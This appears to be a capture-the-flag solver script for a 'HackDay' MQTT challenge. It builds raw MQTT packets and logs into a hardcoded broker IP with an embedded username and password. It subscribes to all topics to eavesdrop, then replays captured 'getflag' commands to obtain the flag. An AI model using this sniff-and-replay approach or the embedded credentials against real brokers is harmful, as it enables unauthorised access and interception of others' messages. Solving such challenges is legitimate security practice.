import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len]) 
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_publish(topic, message):
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    fixed_header = b'\x30'
    if rem_len < 128:
        fixed_header += bytes([rem_len])
    else:
        fixed_header += bytes([(rem_len & 0x7F) | 0x80, rem_len >> 7])
    return fixed_header + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("solver-3-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    s.sendall(mqtt_subscribe("response/#", 3001))
    s.sendall(mqtt_subscribe("ctf/#", 3002))
    s.sendall(mqtt_subscribe("#", 3003))
    
    # Commands we saw:
    # getflag 946684800 42093d9b "Nobody like mosquitoes" response/flag
    # getflag 95147b43ecfcf4cdb069a500ac1eb7b29bcb901638ac4c35a06863d526bb055b Nobody_like_mosquitoes 42093d9b
    
    commands = [
        'getflag 946684800 42093d9b "Nobody like mosquitoes" response/flag',
        'getflag 95147b43ecfcf4cdb069a500ac1eb7b29bcb901638ac4c35a06863d526bb055b Nobody_like_mosquitoes 42093d9b',
        'getflag 95147b43ecfcf4cdb069a500ac1eb7b29bcb901638ac4c35a06863d526bb055b Nobody_like_mosquitoes 42093d9b response/myflag'
    ]
    
    for cmd in commands:
        print(f"[*] Sending: {cmd}")
        s.sendall(mqtt_publish("ctf/hackday", cmd))
        time.sleep(1)

    try:
        while True:
            data = s.recv(4096)
            if not data: break
            try:
                text = data.decode(errors='ignore')
                print(f"[*] Text: {text}")
                if "HACKDAY{" in text:
                    print("[!!!] FLAG FOUND [!!!]")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
